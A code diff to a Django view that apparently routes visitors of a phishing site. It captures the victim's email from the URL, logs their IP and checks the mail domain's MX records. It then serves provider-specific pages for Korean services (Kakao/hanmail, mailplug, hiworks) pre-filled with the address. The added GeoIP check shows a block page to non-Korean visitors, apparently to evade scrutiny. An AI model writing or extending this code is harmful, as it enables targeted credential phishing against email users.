@@ -6,28 +6,43 @@ from email.mime.multipart import MIMEMultipart
 from django.template.loader import get_template
 from django.template import Context
 from django.template.loader import render_to_string
+from django.contrib.gis.geoip2 import GeoIP2
 import dns.resolver
 import socket
 import requests
 import pycountry
 #Create your views here.
+from django.contrib.auth.decorators import login_required
+from django.views.decorators.csrf import csrf_protect
+from defender.decorators import watch_login
+
+@watch_login
+@csrf_protect
 
 def landing(request):
     iplogger = request.META.get("HTTP_X_FORWARDED_FOR")
     emailgrabber = request.GET["email"]
     domainapi = emailgrabber[emailgrabber.index('@') + 1 : ]
     mx_records = dns.resolver.query(domainapi, 'MX')
-    for mx in mx_records:
-        mx_hostname = str(mx.exchange).rstrip('.')
-        if 'hanmail.net' in mx_hostname:
-            return render(request, 'kakao.html')
-        elif 'mailplug.com' in mx_hostname:
-            return render(request, 'mailplug.html')
-        elif 'hiworks.co.kr' in mx_hostname:
-            return render(request, 'hiwoks.html')
+    # Initialize GeoIP2 object
+    geo = GeoIP2()
 
-    # if no matching MX hostnames were found
-    return render(request, 'general.html')
+    # Get user's country based on IP address
+    country = geo.country(iplogger)
+
+    # Check if user is from Korea
+    if country['country_code'] != 'KR':
+        return render(request, 'block.html') # Return block page if user is not from Korea
+    else:
+        for mx in mx_records:
+            mx_hostname = str(mx.exchange).rstrip('.')
+            if 'hanmail.net' in mx_hostname:
+                return render(request, 'Kakao.html', {'email': emailgrabber, 'domains': domainapi})
+            elif 'mailplug.com' in mx_hostname:
+                return render(request, 'mailplug.html', {'email': emailgrabber, 'domains': domainapi})
+            elif 'hiworks.co.kr' in mx_hostname:
+                return render(request, 'hiwoks.html', {'email': emailgrabber, 'domains': domainapi})
+        return render(request, 'general.html', {'email': emailgrabber, 'domains': domainapi})
 
 
 
